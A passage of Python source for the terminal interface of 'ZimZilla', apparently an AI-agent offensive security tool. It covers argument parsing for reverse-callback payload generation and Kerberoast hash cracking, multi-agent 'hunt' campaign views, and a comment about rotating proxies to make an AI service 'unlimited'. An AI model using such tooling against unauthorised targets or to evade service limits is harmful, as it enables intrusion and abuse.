"""The main Textual application."""

from __future__ import annotations

import asyncio
import dataclasses
import shutil
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import TYPE_CHECKING, Callable

if TYPE_CHECKING:  # pragma: no cover - typing only, keeps the import graph flat
    from ..termcolors import TerminalColors

from rich.text import Text
from textual import on, work
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Horizontal, Vertical, VerticalScroll
from textual.events import Click, MouseMove, MouseUp, TextSelected
from textual.css.query import NoMatches
from textual.message import Message
from textual.screen import ModalScreen
from textual.widgets import Input, Static

from .. import ad as ad_mod
from .. import aihubmix as ah_mod
from .. import beatapi as bp_mod
from .. import crack as crack_mod
from .. import antseed as as_mod
from .. import effort as effort_mod
from .. import hunt as hunt_mod
from .. import infronai as inf_mod
from .. import iteracompute as ic_mod
from .. import ldxhub as ldx_mod
from .. import leadgen as leadgen_mod
from .. import logfare as lf_mod
from .. import nvidia as nv_mod
from .. import opencode as oc_mod
from .. import osint as osint_mod
from .. import openrouter as or_mod
from .. import osint_tree as osint_tree_mod
from .. import phish as phish_mod
from .. import payload as payload_mod
from .. import reverse as reverse_mod
from .. import session as session_mod
from .. import shodan as shodan_mod
from .. import sources as sources_mod
from .. import team as team_mod
from .. import tokenharbour as th_mod
from .. import tools as tools_mod
from .. import unorouter as uno_mod
from ..agent import Agent, Deliverable
from ..config import KNOWN_MODELS, MODES, Config, find_agents_file, price_for
from ..scope import Scope
from ..theme import (SYSTEM_THEME, THEME_NAMES, THINKING_VERBS, agent_color,
                     get_palette, set_current_theme)
from . import renderers as R
from .markdown import markdown_renderable
from .boot import BootScreen
from .complete import CompletionPopup, _iter_files
from .palette_cmd import CommandPalette, PaletteEntry
from .rails import LoopRail, TelemetryRail
from .web import WaveWeb
from .widgets import ChatPane, HeaderBar, PromptInput, StatusBar, ZimPane


#: What `/zim-opencode` says while it works. Deliberately no counts: how many
#: proxies are in the pool says nothing about how many will be accepted (a pool
#: of 24 measured 12% usable at one point and 79% at another), so a number would
#: be noise dressed as information. The promise it does make — a working route,
#: and a different one next time — is one the command can actually keep.
_HUNTING = "ZIM IS MAKING IT UNLIMITED - FINDING THE BEST PROXIES ..."

#: Braille spinner. Chosen over the ASCII `|/-\` because it advances in place
#: without the baseline jitter that makes an ASCII spinner look like the line
#: is being rewritten.
_HUNT_FRAMES = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"


def _dedupe(items) -> list[str]:
    """Order-preserving de-dupe.

    ``Scope.extract_targets`` can return the same host twice — its URL pass and
    its bare-token pass both match — and the operator should read the target
    once, not twice.
    """
    return list(dict.fromkeys(items))


def _ago(seconds: float | None) -> str:
    """A catalog's age in words — ``"just now"``, ``"4m old"``, ``"3h old"``.

    ``None`` means nothing has been fetched, which is not an age and must not
    render as one. `/model` uses this to say how current its list is instead of
    asserting that it is current; the whole point of the line is that the two
    cases — fetched a moment ago and fetched at startup — look identical
    otherwise.
    """
    if seconds is None:
        return "never fetched"
    if seconds < 45:
        return "just now"
    if seconds < 3600:
        return f"{int(seconds // 60)}m old"
    if seconds < 86400:
        return f"{int(seconds // 3600)}h old"
    return f"{int(seconds // 86400)}d old"


def _catalog_clause(age: float | None, ttl: float) -> str:
    """One honest clause about how current a fetched catalog is.

    ``age`` is ``None`` when nothing was ever fetched. At or past ``ttl`` the
    module's own readers have already handed back ``None`` in place of the
    list, so calling that "live" would contradict the very list above it.
    """
    if age is None:
        return "not fetched yet"
    if age >= ttl:
        return f"expired ({_ago(age)})"
    return f"live ({_ago(age)})"


#: `/crack`'s default budget. Thirty minutes, chosen so the ladder's *useful*
#: stages actually fit the case this command exists for. A Kerberoast hash —
#: what `/ad` produces — runs the dictionary in ~12s and best64 in ~16m on this
#: host, so a ten-minute default would drop best64, which is precisely the stage
#: that cracks corporate passwords. A default that excludes the stage that works
#: is not a default, it is a trap.
#:
#: The mask is still excluded (7h on a Kerberoast, 4m on an NTLM), and that is
#: correct: it is the escalation of last resort and the plan prints it as
#: dropped, by name. An operator who wants more or less says `--max-time`.
CRACK_DEFAULT_BUDGET = 1800.0


#: Column the model id is padded to in `/models`, before its blurb. Wide enough
#: for a TokenHarbour id with room to spare, and narrower than most OpenRouter
#: ids — which is the point of the over-long branch in `_show_models`: those wrap
#: rather than truncate, because the id is what the operator retypes.
_MODEL_COL = 34


def _upstream_style(palette, tier: str) -> str:
    """The colour for a UnoRouter upstream-redundancy tier.

    **This is ZimZilla's tier, not UnoRouter's status.** The gateway's catalog
    publishes a channel *list* and no per-channel health, so there is no green
    dot to read and none is invented: what is coloured here is how many channels
    stand behind a model, which is a fact, mapped through thresholds that are
    ours (see ``unorouter.UPSTREAM_THIN``). The count is printed next to the
    colour precisely so the colour can never be mistaken for a signal the
    gateway issued.

    ``unknown`` is deliberately dim rather than green or amber. A catalog that
    did not say is not a good sign or a bad one, and colouring it either way
    would be reading a fact into a blank.
    """
    return {
        "good": palette.accent,
        "thin": palette.amber,
        "single": palette.red,
        "unknown": palette.dim,
    }.get(tier, palette.dim)


def _parse_payload_args(args) -> tuple[dict, str]:
    """Parse `/payload`'s arguments. Returns ``(opts, err)``.

    Split out of the command so the parse is testable on its own, the same
    shape as ``_parse_crack_args``. Every malformed flag is refused here with
    the value named, rather than silently becoming part of the extension or a
    nonsense port — a wrong ``--lport`` produces a payload that calls back
    nowhere, and that failure is invisible until delivery.
    """
    opts: dict = {
        "ext": "",
        "lhost": None,
        "lport": payload_mod.DEFAULT_LPORT,
        "payload": None,
        "encoder": None,
        "iterations": None,
        "bad_chars": None,
        "template": None,
        "out": None,
        "dry_run": False,
        "handler_only": False,
    }

    valued = {
        "--lhost": "lhost", "--lport": "lport", "--payload": "payload",
        "--encoder": "encoder", "--iterations": "iterations",
        "--bad-chars": "bad_chars", "--template": "template", "--out": "out",
    }

    i = 0
    while i < len(args):
        arg = args[i]
        name = arg.partition("=")[0]
        if name in valued:
            value = arg.partition("=")[2] if "=" in arg else (
                args[i + 1] if i + 1 < len(args) else "")
            if "=" not in arg:
                i += 1  # consume the value too
            if not value:
                return opts, f"{name} needs a value"
            key = valued[name]
            if key == "lport":
                if not value.isdigit():
                    return opts, f"--lport takes a port number, not {value!r}"
                port = int(value)
                if not (1 <= port <= 65535):
                    return opts, f"--lport must be 1-65535, not {port}"
                opts["lport"] = port
            elif key == "iterations":
                if not value.isdigit():
                    return opts, f"--iterations takes a number, not {value!r}"
                opts["iterations"] = int(value)
            else:
                opts[key] = value
        elif arg in ("--dry-run", "-n"):
            opts["dry_run"] = True
        elif arg == "--handler":
            opts["handler_only"] = True
        elif arg.startswith("--"):
            return opts, (
                f"unknown flag {arg!r} — /payload takes <ext> "
                "[--lhost IP] [--lport N] [--payload ID] [--encoder E] "
                "[--iterations N] [--bad-chars B] [--template FILE] "
                "[--out PATH] [--dry-run] [--handler]")
        elif not opts["ext"]:
            opts["ext"] = arg
        else:
            return opts, (
                f"unexpected extra argument {arg!r} — /payload takes one "
                "extension")
        i += 1

    if not opts["ext"]:
        return opts, "usage: /payload <ext>  — /payload with no argument lists them"
    return opts, ""


def _parse_crack_args(args) -> tuple[str, int | None, float, bool, str]:
    """Parse `/crack`'s arguments. Returns ``(path, mode, max_time, deep, err)``.

    Split out of the command so the parse is testable on its own — every
    malformed flag is refused here, with the value named, rather than silently
    becoming part of the path or a nonsense budget. `--mode` is validated against
    the modes this command knows, because a wrong mode number does not fail: it
    spends the entire budget on a format that cannot match.
    """
    path_arg = ""
    mode: int | None = None
    max_time = CRACK_DEFAULT_BUDGET
    deep = False

    i = 0
    while i < len(args):
        arg = args[i]
        name = arg.partition("=")[0]
        if name in ("--mode", "--max-time"):
            value = arg.partition("=")[2] if "=" in arg else (
                args[i + 1] if i + 1 < len(args) else "")
            if "=" not in arg:
                i += 1  # consume the value too
            if not value:
                return "", None, max_time, deep, (
                    f"{name} needs a value, e.g. /crack hashes.txt "
                    f"{name} {'13100' if name == '--mode' else '600'}")
            if name == "--mode":
                if not value.isdigit():
                    return "", None, max_time, deep, (
                        f"--mode takes a hashcat mode number, not {value!r} — "
                        "try /crack --help for the ones this knows")
                mode = int(value)
                if mode not in crack_mod.HASH_MODES:
                    known = ", ".join(str(m) for m in sorted(crack_mod.HASH_MODES))
                    return "", None, max_time, deep, (
                        f"mode {mode} is not one /crack knows ({known}) — pass "
                        "--mode only for a format in that list, or let the file "
                        "be identified")
            else:
                try:
                    max_time = float(value)
                except ValueError:
                    return "", None, max_time, deep, (
                        f"--max-time takes seconds, not {value!r}")
                if max_time <= 0:
                    return "", None, max_time, deep, (
                        "--max-time must be greater than zero")
        elif arg == "--deep":
            deep = True
        elif arg.startswith("--"):
            return "", None, max_time, deep, (
                f"unknown flag {arg!r} — /crack takes "
                "<file|dir> [--mode N] [--max-time S] [--deep]")
        elif not path_arg:
            path_arg = arg
        else:
            return "", None, max_time, deep, (
                f"unexpected extra argument {arg!r} — /crack takes one path")
        i += 1

    return path_arg, mode, max_time, deep, ""


class PermissionModal(ModalScreen[str]):
    """Confirmation panel for gated tools. Dismisses with yes/no/always."""

    BINDINGS = [
        Binding("y", "choose('yes')", "yes"),
        Binding("n", "choose('no')", "no"),
        Binding("a", "choose('always')", "always"),
        Binding("escape", "choose('no')", "no"),
        Binding("enter", "choose('yes')", "yes"),
    ]

    def __init__(self, name: str, preview, palette, remaining: int = 0,
                 radius: str = "") -> None:
        super().__init__()
        self.tool_name = name
        self.preview = preview
        self.palette = palette
        self.remaining = remaining
        self.radius = radius

    def compose(self) -> ComposeResult:
        with Vertical(id="perm-box"):
            yield Static(id="perm-title")
            yield Static(id="perm-radius")
            with VerticalScroll(id="perm-body"):
                yield Static(id="perm-content")
            yield Static(id="perm-keys")
            yield Static(id="perm-progress")

    def on_mount(self) -> None:
        p = self.palette
        # Trap focus inside the modal so stray keys never reach the prompt.
        box = self.query_one("#perm-box")
        box.can_focus = True
        box.focus()
        title = Text()
        title.append("⚠ PERMISSION REQUIRED  ", style=f"bold black on {p.amber}")
        title.append("  " + self.preview.title, style=f"bold {p.primary}")
        self.query_one("#perm-title", Static).update(title)

        if self.preview.kind == "diff":
            verb = self.preview.title.split(" ", 1)[0]
            content = R.diff_panel(
                self.preview.title.split(" ", 1)[-1], self.preview.body, p, verb
            )
        else:
            content = R.render_output_text(self.preview.body, p)
        self.query_one("#perm-content", Static).update(content)

        # Blast radius: what this call would actually touch, before you answer.
        if self.radius:
            rad = Text()
            rad.append("⌖ ", style=p.dim)
            rad.append(self.radius, style=p.amber)
            self.query_one("#perm-radius", Static).update(rad)

        keys = Text()
        keys.append("[y]", style=f"bold {p.accent}")
        keys.append(" execute   ", style=p.dim)
        keys.append("[n]", style=f"bold {p.red}")
        keys.append(" deny      ", style=p.dim)
        keys.append("[a]", style=f"bold {p.primary}")
        keys.append(" always this session", style=p.dim)
        self.query_one("#perm-keys", Static).update(keys)

        if self.remaining:
            self.query_one("#perm-progress", Static).update(
                Text(f"  ({self.remaining} more tool call(s) queued this turn)", style=p.dim)
            )

    def action_choose(self, value: str) -> None:
        self.dismiss(value)


class ReconOverlay(ModalScreen[None]):
    """A centred window showing the recon phase working, live.

    Recon can run for minutes against a live target, and until it finishes the
    operator has nothing to look at — the zim-pane belongs to the waves, which
    have not started. So this floats over the middle of the screen and narrates
    what recon is actually doing: each tool call as it is made, and the model's
    prose as it is written.

    It is deliberately not a gate. There is nothing to confirm, so it takes no
    input, has no keys and cannot be dismissed by the operator — ``run_hunt``
    pops it when recon ends. ``can_focus = False`` keeps the prompt underneath
    alive, which is what lets ``/stop-hunt`` and the other busy-permitted
    commands still be typed while it is up.
    """

    can_focus = False

    def __init__(self, target: str, palette, cfg: Config) -> None:
        super().__init__()
        self.target = target
        self.palette = palette
        self.cfg = cfg
        #: The tail of the activity log. Bounded: a recon run makes dozens of
        #: calls, and the window only has room for the last few.
        self.lines: list[Text] = []
        self.calls = 0
        self.started = time.monotonic()

    def compose(self) -> ComposeResult:
        with Vertical(id="recon-box"):
            yield Static(id="recon-title")
            yield Static(id="recon-status")
            with VerticalScroll(id="recon-log"):
                yield Static(id="recon-lines")

    def on_mount(self) -> None:
        # A recon that finishes before this screen has mounted is not
        # hypothetical: a target that answers instantly runs recon to its
        # conclusion in the same tick it was pushed from, and `run_hunt` pops
        # the window as soon as recon is done. The pop tears the widget tree
        # down before the queued Mount message lands, so the children are
        # already gone by the time this runs — `query_one` then raises out of a
        # message handler, which Textual treats as an app crash. An overlay
        # that is on its way off screen has nothing to paint.
        p = self.palette
        t = Text()
        t.append("  ⟩ RECON  ", style=f"bold {p.bg} on {p.accent}")
        t.append("  mapping ", style=p.dim)
        t.append(self.target, style=f"bold {p.primary}")
        try:
            self.query_one("#recon-title", Static).update(t)
            self._paint_status()
        except NoMatches:
            return

    def note(self, event: dict) -> None:
        """Apply one recon event and repaint."""
        kind = event.get("type")
        p = self.palette
        if kind == "hunt_recon_tool":
            self.calls += 1
            tool = event.get("tool", "?")
            detail = tools_mod.summarise_call(tool, event.get("args") or {}, self.cfg)
            if len(detail) > 72:
                detail = detail[:71] + "…"
            t = Text()
            t.append(f"  {self.calls:>3}  ", style=p.dim)
            t.append("✗ " if event.get("blocked") else "▸ ", style=p.red if event.get("blocked") else p.accent)
            t.append(f"{tool:<12}", style=f"bold {p.primary}")
            t.append(detail, style=p.dim)
            self._push(t)
        elif kind == "hunt_recon_text":
            text = (event.get("text") or "").strip()
            if text:
                t = Text()
                t.append("       ", style=p.dim)
                t.append(text, style=p.primary)
                self._push(t)
        self._paint_status()

    def _push(self, line: Text) -> None:
        self.lines.append(line)
        if len(self.lines) > 200:
            self.lines = self.lines[-200:]
        try:
            self.query_one("#recon-lines", Static).update(
                Text("\n").join(self.lines[-40:])
            )
            self.query_one("#recon-log", VerticalScroll).scroll_end(animate=False)
        except NoMatches:
            # Torn down before it could mount — see on_mount. The lines are
            # still kept, so nothing is lost if it does come up.
            pass

    def _paint_status(self) -> None:
        p = self.palette
        elapsed = int(time.monotonic() - self.started)
        t = Text()
        t.append("  ", style=p.dim)
        t.append(f"{self.calls} call{'s' if self.calls != 1 else ''}", style=p.primary)
        t.append("   ·   ", style=p.dim)
        t.append(f"{elapsed // 60}:{elapsed % 60:02d}", style=p.primary)
        t.append("   ·   ", style=p.dim)
        t.append("working", style=f"bold {p.accent}")
        try:
            self.query_one("#recon-status", Static).update(t)
        except NoMatches:
            pass


class WaveOverlay(ModalScreen[None]):
    """The wave, drawn as panes around a tracker rail.

    Ten agents streaming into one transcript is unreadable — the operator sees
    interleaved tool output and has to reconstruct which agent is doing what,
    and the findings are buried in whichever stream happened to print them.
    This takes the screen for the duration of a wave and draws the shape
    instead: one pane per agent showing the command it is on and what that
    command returned, beside a rail that tallies what has been found,
    worst-first, as it is found.

    Like ``ReconOverlay`` it is a window you look at rather than answer, so
    ``can_focus = False`` — it never wants the keyboard for itself. Be clear
    about what that does and does not buy, because the difference matters when a
    campaign has to be stopped: it stops this screen from *taking* focus, but
    pushing any screen moves focus off the prompt and this one paints over it,
    so the prompt underneath is not reachable while it is up and ``/stop-hunt``
    cannot be typed from here. Two keys stand in for it: ``ctrl+x`` asks the
    campaign to stop the same way the command does, and ``ctrl+c`` interrupts
    harder — ``interrupt`` is a priority binding on the app, so it fires above
    the active screen and cancels the workers outright rather than letting the
    wave unwind. It is popped at the wave boundary and by the worker's
    ``finally``, so a stop or a crash mid-wave cannot strand it over a dead
    campaign.

    The drawing itself lives in ``ui/web.py``; this screen owns the timer that
    repaints it, the size it paints at, and the mouse and key handling. The
    repaint is on a timer rather than driven by events because three things on
    it change without any event: the elapsed clock, the flash that fades off an
    agent a couple of seconds after it reports, and the spinner that says a
    quiet agent is still working.
    """

    can_focus = False

    #: Repaint interval. Fast enough that the spinner and the flash read as
    #: live, slow enough that a full-canvas redraw is not competing with the
    #: agents' streaming for the UI thread.
    TICK = 0.25

    BINDINGS = [
        Binding("escape", "close_detail", "close", show=False),
        Binding("ctrl+x", "stop_hunt", "stop", show=False),
        Binding("left", "rail_narrower", "rail -", show=False),
        Binding("right", "rail_wider", "rail +", show=False),
        Binding("shift+left", "drawer_narrower", "drawer -", show=False),
        Binding("shift+right", "drawer_wider", "drawer +", show=False),
    ]

    class StopRequested(Message):
        """The operator asked to end the campaign from the wave view.

        A message rather than a direct call into the app, so this screen does
        not have to know how a hunt is stopped — it only has to know that the
        operator asked. The app owns ``_hunt_stop`` and decides what to do.
        """

    def __init__(self, target: str, palette, *, wave: int = 1,
                 size: int = 10) -> None:
        super().__init__()
        self.palette = palette
        self.web = WaveWeb(target, palette, wave=wave, size=size)

    def compose(self) -> ComposeResult:
        yield Static(id="wave-canvas")

    def on_mount(self) -> None:
        self._paint()
        self.set_interval(self.TICK, self._paint)

    # ---- events -----------------------------------------------------------
    def note(self, event: dict) -> None:
        """Apply one hunt event to the view. Repaint is left to the timer.

        Every event a wave produces that has something to draw is handled here.
        Three of them used to be routed to this screen by ``_hunt_run`` and then
        dropped on the floor — ``hunt_plan_text``, ``hunt_plan_tool`` and
        ``hunt_agent_result`` — which is why the panes showed a command and no
        output, and why the planner's turn was a blank screen.
        """
        etype = event.get("type")
        if etype == "hunt_plan":
            self.web.set_plan(event.get("workers") or [],
                              wave=event.get("wave", self.web.wave))
        elif etype == "hunt_agent_start":
            self.web.agent_start(event.get("name", ""), event.get("brief", ""))
        elif etype == "hunt_agent_tool":
            # The command, not the summary: the summary is clipped to 70 columns
            # for a transcript line, and the whole point of the pane is that it
            # has room for the real command.
            self.web.agent_activity(
                event.get("name", ""),
                tools_mod.summarise_call(event.get("tool", ""),
                                         event.get("args") or {},
                                         self.cfg_of(), max_len=400))
        elif etype == "hunt_agent_result":
            self.web.agent_result(
                event.get("name", ""),
                tools_mod.summarise_call(event.get("tool", ""),
                                         event.get("args") or {},
                                         self.cfg_of(), max_len=400),
                event.get("output", ""))
        elif etype == "hunt_agent_text":
            self.web.agent_text(event.get("name", ""), event.get("text", ""))
        elif etype == "hunt_agent_done":
            self.web.agent_done(event.get("name", ""), ok=bool(event.get("ok")))
        elif etype == "hunt_finding":
            self.web.add_finding(event.get("finding") or {})
            # Paint at once rather than waiting for the tick. A finding landing
            # is the one thing on this screen the operator is watching for, and
            # a quarter-second delay on it is the difference between the tracker
            # reading as live and reading as a poll.
            self._paint()
        elif etype == "hunt_plan_text":
            self.web.planner_text(event.get("text", ""))
        elif etype == "hunt_plan_tool":
            self.web.planner_tool(event.get("tool", ""),
                                  event.get("args") or {}, self.cfg_of())
        elif etype == "hunt_wave_end":
            self.web.end()

    def cfg_of(self):
        """The Config the summariser needs. Kept as a method so tests can stub it."""
        return self.app.cfg

    # ---- mouse ------------------------------------------------------------
    def on_click(self, event: Click) -> None:
        """A click resolves against the hit map the last render produced.

        The canvas fills this screen and sits at its origin, so the event's
        widget-relative coordinates are the grid coordinates — no translation,
        and no need for the view to predict where it drew anything.
        """
        hit = self.web.click(event.x, event.y)
        if hit is not None:
            self.web.hover = (event.x, event.y)
        self._paint()

    def on_mouse_move(self, event: MouseMove) -> None:
        """Track the pointer so clickable things can light up under it."""
        pos = (event.x, event.y)
        if pos != self.web.hover:
            self.web.hover = pos
            self._paint()

    def on_mouse_scroll_down(self, event) -> None:
        """Scroll the drawer, or rotate the pane window when it is closed."""
        self._scroll_detail(1)

    def on_mouse_scroll_up(self, event) -> None:
        self._scroll_detail(-1)

    def _scroll_detail(self, delta: int) -> None:
        if self.web.detail:
            self.web.scroll_detail(delta)
            self._paint()

    # ---- keys -------------------------------------------------------------
    def action_close_detail(self) -> None:
        if self.web.detail:
            self.web.close_detail()
            self._paint()

    def action_stop_hunt(self) -> None:
        """``ctrl+x`` — ask the app to end the campaign.

        This exists because this screen covers the prompt: ``/stop-hunt`` cannot
        be typed while the wave view is up (see the class docstring), so without
        a key here the only way out of a runaway campaign would be ``ctrl+c``,
        which cancels the workers outright rather than letting the wave unwind.

        Idempotent, and it paints immediately rather than waiting for the repaint
        timer so the footer confirms the keypress at once.
        """
        self.web.stopping = True
        self._paint()
        self.post_message(self.StopRequested())

    def action_rail_wider(self) -> None:
        self.web.resize_rail(2)
        self._paint()

    def action_rail_narrower(self) -> None:
        self.web.resize_rail(-2)
        self._paint()

    def action_drawer_wider(self) -> None:
        self.web.resize_drawer(4)
        self._paint()

    def action_drawer_narrower(self) -> None:
        self.web.resize_drawer(-4)
        self._paint()

    def _paint(self) -> None:
        try:
            canvas = self.query_one("#wave-canvas", Static)
        except NoMatches:
            # Torn down before it mounted, or already popped — see the note in
            # ReconOverlay.on_mount for how a wave can end in the tick it began.
            return
        size = self.size
        canvas.update(self.web.render(size.width, size.height))


class ScopePasteScreen(ModalScreen[str | None]):
    """A multi-line box for pasting a programme overview.

    The prompt is one row and would fold a pasted overview into a single line,
    so this takes the paste as a ``TextArea`` instead. ``ctrl+s`` submits the
    text and ``escape`` cancels; a cancel dismisses with ``None``.
    """

    DEFAULT_CSS = """
    ScopePasteScreen { align: center middle; background: $background 70%; }
    #scope-paste-box {
        width: 90%; height: 85%; border: round $secondary; padding: 1 2;
        background: $surface;
    }
    #scope-paste-hint { height: auto; margin-bottom: 1; }
    #scope-paste-text { height: 1fr; }
    """

    BINDINGS = [
        Binding("ctrl+s", "submit", "run", priority=True),
        Binding("escape", "cancel", "cancel", priority=True),
    ]

    def __init__(self, palette) -> None:
        super().__init__()
        self.palette = palette

    def compose(self) -> ComposeResult:
        from textual.widgets import TextArea
        with Vertical(id="scope-paste-box"):
            yield Static(
                "Paste the whole programme overview — scope, out of scope, rules.\n"
                "ctrl+s runs the validator · escape cancels",
                id="scope-paste-hint",
            )
            yield TextArea(id="scope-paste-text", soft_wrap=True, show_line_numbers=False)

    def on_mount(self) -> None:
        self.query_one("#scope-paste-text").focus()

    def action_submit(self) -> None:
        from textual.widgets import TextArea
        text = self.query_one("#scope-paste-text", TextArea).text
        self.dismiss(text if text.strip() else None)

    def action_cancel(self) -> None:
        self.dismiss(None)


class FindingsPanel(ModalScreen[None]):
    """The hunt's finding tracker, as its own window.

    The transcript shows a finding the moment it lands and then scrolls past it;
    the zim-pane shows only counts. Neither answers "what has this engagement
    actually found", which is the question the operator asks while it runs and
    again when it is over. So this floats a worst-first list over the screen:
    severity, title, asset, wave, and the evidence that proves it.

    It is a *view*, not a gate — ``can_focus = False`` so it never takes the
    keyboard, and ``escape`` (or ``/findings`` again) closes it. Note that this
    does *not* leave the prompt usable underneath: pushing a screen moves focus
    off the prompt and this one paints over it, so ``/stop-hunt`` cannot be typed
    while it is open and ``ctrl+c`` is the way to interrupt from here. (The same
    holds for ``WaveOverlay`` and ``ReconOverlay``; see ``WaveOverlay``'s
    docstring.) ``set_findings`` repaints it in place, so the hunt worker can push
    each new finding in without reopening the window.

    There is deliberately no click-to-dismiss: a click anywhere inside the
    panel bubbles to this screen, so handling clicks here would close the
    window the moment the operator clicked a finding to read it.
    """

    can_focus = False

    BINDINGS = [Binding("escape", "dismiss_panel", "close", show=False)]

    def __init__(self, palette, *, target: str = "", live: bool = False) -> None:
        super().__init__()
        self.palette = palette
        self.target = target
        #: Whether a campaign is still running, so the header can say LIVE vs a
        #: finished campaign read back off disk.
        self.live = live
        self.findings: list[dict] = []

    def compose(self) -> ComposeResult:
        with Vertical(id="findings-box"):
            yield Static(id="findings-title")
            with VerticalScroll(id="findings-log"):
                yield Static(id="findings-body")

    def on_mount(self) -> None:
        self._paint()

    def set_findings(self, findings: list[dict]) -> None:
        """Replace the list and repaint. Called as each finding lands."""
        self.findings = list(findings or [])
        self._paint()

    def action_dismiss_panel(self) -> None:
        self.dismiss(None)

    def _paint(self) -> None:
        try:
            self.query_one("#findings-title", Static).update(self._title())
            self.query_one("#findings-body", Static).update(self._body())
        except NoMatches:
            # Torn down before it mounted — the panel is dismissable and a hunt
            # can end in the same tick it was opened. Nothing to paint.
            return

    def _title(self) -> Text:
        p = self.palette
        t = Text()
        t.append("  ⟩ FINDINGS  ", style=f"bold {p.bg} on {p.accent}")
        t.append("  ", style=p.dim)
        t.append(self.target or "?", style=f"bold {p.primary}")
        t.append("   ", style=p.dim)
        t.append(f"{len(self.findings)}", style=f"bold {p.primary}")
        t.append(" found", style=p.dim)
        if self.live:
            t.append("   ·   ", style=p.dim)
            t.append("LIVE", style=f"bold {p.accent}")
        t.append("      ", style=p.dim)
        t.append("[esc] close", style=p.dim)
        return t

    def _body(self) -> Text:
        p = self.palette
        t = Text()
        if not self.findings:
            t.append("\n  nothing confirmed yet.\n\n", style=p.dim)
            t.append(
                "  A finding appears here the moment an agent reports one —\n"
                "  a title, the asset, and the evidence that proves it.\n",
                style=p.dim,
            )
            return t
        for i, f in enumerate(self.findings):
            if i:
                t.append("\n")
            t.append_text(R.finding_line(f, p))
            t.append("\n")
            t.append_text(R.finding_detail(f, p))
        return t


class ZimZillaApp(App):
    """Top-level application: boot screen, then the shell."""

    # Textual already highlights on drag. We copy the highlight as soon as
    # the mouse is released so the operator never has to remember a binding.
    ALLOW_SELECT = True

    CSS = """
    Screen {
        background: $background;
        layers: rain main;
    }
    #rain {
        layer: rain;
        width: 100%;
        height: 100%;
    }
    #main {
        layer: main;
        width: 100%;
        height: 1fr;
    }
    /* Below ~100 cols the rails are hidden by on_resize and the layout is
       today's two-pane shell. The transcript is never the thing that shrinks. */
    Screen.narrow LoopRail, Screen.narrow TelemetryRail { display: none; }
    /* ZimPane stays up on a narrow terminal: the operator opened it on
       purpose, and close/minimize/resize are how they put it away. */
    #bottom-dock {
        dock: bottom;
        height: auto;
        layer: main;
    }
    HeaderBar, StatusBar, Input { layer: main; }

    /* Colours come from theme variables, so /theme re-skins these too. */
    #input {
        height: 3;
        border: round $primary;
        background: $background;
        color: $primary;
        margin: 0;
        padding: 0 1;
    }
    Input:focus {
        border: round $accent;
        /* Textual tints the focused input with $foreground 5%, which renders as
           a shade outside the palette. Turn the tint off so the field keeps the
           palette background exactly. */
        background-tint: transparent;
    }
    Input > .input--placeholder, Input > .input--suggestion {
        color: $secondary;
        background: $background;
    }
    Input > .input--cursor {
        color: $background;
        background: $accent;
        text-style: bold;
    }
    Input > .input--selection {
        background: $secondary;
        color: $primary;
    }
    PermissionModal {
        align: center middle;
        /* Dim toward the palette background, not toward black: on a terminal
           whose background is not black, rgba(0,0,0,…) would tint the scrim a
           different colour from the rest of the interface. */
        background: $background 75%;
    }
    #perm-box {
        width: 84%;
        max-width: 120;
        height: auto;
        max-height: 80%;
        border: heavy $warning;
        background: $background;
        padding: 1 2;
    }
    #perm-body {
        height: auto;
        max-height: 24;
    }
    /* The palette's query field lives in the app CSS, not the screen's
       DEFAULT_CSS: the global `Input:focus` rule below would otherwise give it
       a border, and a 1-row field with a border has no content area at all. */
    #pal-query, #pal-query:focus {
        height: 1;
        border: none;
        background: $background;
        color: $primary;
        padding: 0;
        background-tint: transparent;
    }
    #pal-query > .input--placeholder { color: $secondary; background: $background; }
    #pal-query > .input--cursor { color: $background; background: $accent; }

    /* NOTE: no `Input:focus` rule here. The global rule above matches the
       palette's query field too and, at height 1, leaves no content area — so
       the typed query would be invisible. #pal-query resets it explicitly. */

    #perm-title { height: 1; }
    #perm-radius { height: auto; color: $warning; }
    #perm-content { height: auto; }
    #perm-keys { height: 1; margin-top: 1; }
    #perm-progress { height: 1; color: #0b6e2a; }

    /* The recon window. Centred and floating over the shell, so the operator
       watches the mapping happen instead of staring at a frozen status line.
       Its scrim is lighter than the permission modal's: this is a window you
       look past, not one you answer, and the shell underneath is still live. */
    ReconOverlay {
        align: center middle;
        background: $background 55%;
    }
    #recon-box {
        width: 72%;
        max-width: 96;
        height: auto;
        max-height: 70%;
        border: heavy $accent;
        background: $background;
        padding: 1 2;
    }
    #recon-title { height: 1; }
    #recon-status { height: 1; }
    #recon-log {
        height: auto;
        max-height: 20;
        margin-top: 1;
        scrollbar-size-vertical: 1;
        scrollbar-color: $secondary;
    }
    #recon-lines { height: auto; }
    /* The wave web. Unlike the recon window this is not a floating box: the
       geometry needs the whole screen — two columns of panes, a centre node and
       the silk between them — so it takes the full area and paints the shell
       over. */
    WaveOverlay { background: $background; }
    #wave-canvas {
        width: 100%;
        height: 100%;
    }
    FindingsPanel {
        align: center middle;
        background: $background 55%;
    }
    #findings-box {
        width: 84%;
        max-width: 120;
        height: auto;
        max-height: 80%;
        border: heavy $accent;
        background: $background;
        padding: 1 2;
    }
    #findings-title { height: 1; }
    #findings-log {
        height: auto;
        max-height: 28;
        margin-top: 1;
        scrollbar-size-vertical: 1;
        scrollbar-color: $secondary;
    }
    #findings-body { height: auto; }
    """

    BINDINGS = [
        Binding("ctrl+c", "interrupt", "interrupt", priority=True),
        Binding("ctrl+d", "quit", "quit", priority=True),
        Binding("ctrl+l", "clear", "clear", priority=True),
        Binding("ctrl+k", "palette", "commands", priority=True),
    ]

    def __init__(self, cfg: Config, term_bg: str | None = None,
                 term_colors: "TerminalColors | None" = None) -> None:
        super().__init__()
        self.cfg = cfg
        #: The terminal's own background, detected over OSC 11 by __main__. None
        #: on a terminal that does not answer, in which case the palette keeps
        #: its own black. Stored so /theme can re-skin onto the same colour.
        self.term_bg = term_bg
        #: The terminal's full palette (background, foreground, the 16 ANSI
        #: slots), detected in the same round-trip. Only the `system` theme
        #: reads it — and it is kept rather than consumed at construction so
        #: `/theme system` can build from it without asking the terminal again
        #: (which would mean another raw-mode session mid-render).
        self.term_colors = term_colors
        self.palette = get_palette(cfg.theme, term_bg, colors=term_colors)
        self.theme_name = cfg.theme
        self.rain_on = cfg.rain
        # Inside a ZimZilla tmux pane the main session can message its peers.
        # Outside one, there is no mailbox and the peer tools stay off.
        from .. import panes as _panes
        self._in_pane = _panes.current_session() is not None
        self.agent = Agent(
            cfg,
